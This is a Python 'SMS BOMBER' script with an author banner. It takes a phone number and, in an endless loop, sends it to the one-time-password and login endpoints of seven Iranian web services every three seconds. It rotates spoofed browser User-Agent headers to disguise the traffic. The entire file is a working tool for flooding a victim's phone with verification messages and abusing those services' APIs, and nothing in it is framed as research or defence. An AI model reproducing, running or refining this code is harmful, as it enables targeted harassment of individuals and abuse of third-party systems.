import numbers
import requests
import random
from colorama import Fore
import os
import time




os.system("clear")
print(Fore.RED + """
███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚══════╝╚═╝   S ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
               SADRA
                    instagram: @sdr_vob                                            
                    0098//telegram: @sdr_vob
                    github: https://github.com/amirsadra0098                                                                 
                                                                                     
                     
                     
                                                                                     """)




number = input(Fore.GREEN+ "enter your number (without 0) ? ")
url_divar = "https://api.divar.ir/v5/auth/authenticate"
json_divar = {"phone":number}
url_snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snap = {"cellphone":"+98" + number}
url_digi = "https://api.digikala.com/v1/user/authenticate/"
json_digi = {"username":"0" + number}
url_abab = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
json_ab = {"phoneNumber":"0" + number}
url_shey = "https://www.sheypoor.com/api/v10.0.0/auth/send"
json_shey = {"username":"0" + number}
url_zar = "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest"
json_zar = {"username":"0" + number}
url_fmo = "https://www.filimo.com/api/fa/v1/user/Authenticate/signin_step1"
json_fmo = {"account":"0" + number}

heads = [
    {    
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {  
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0',
        'Accept': '*/*'
    },
    {
        'User-Agent': 'Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0',
        'Accept': '*/*'
    },
    {
        'User-Agent': 'Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/69.0',
        'Accept': '*/*'
    },
    {
        'User-Agent': 'Mozilla/5.0 (X11; mint; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/69.0',
        'Accept': '*/*'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
        'User-Agent': 'Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    }
]

while True:

    random_head = random.choice(heads)

    req = requests.post(url=url_divar , json=json_divar , headers=random_head)
    print(req)
    req1 = requests.post(url=url_snap , json=json_snap , headers=random_head)
    print(req1)
    req2 = requests.post(url=url_digi, json=json_digi , headers=random_head)
    print(req2)
    req3 = requests.post(url=url_abab , json=json_ab , headers=random_head)
    print(req3)
    req4 = requests.post(url=url_shey , json=json_shey , headers=random_head)
    print(req4)
    req5 = requests.post(url=url_zar , json=json_zar , headers=random_head)
    print(req5)
    req6 = requests.post(url=url_fmo , json=json_fmo , headers=random_head)
    print(req6)

    time.sleep(3)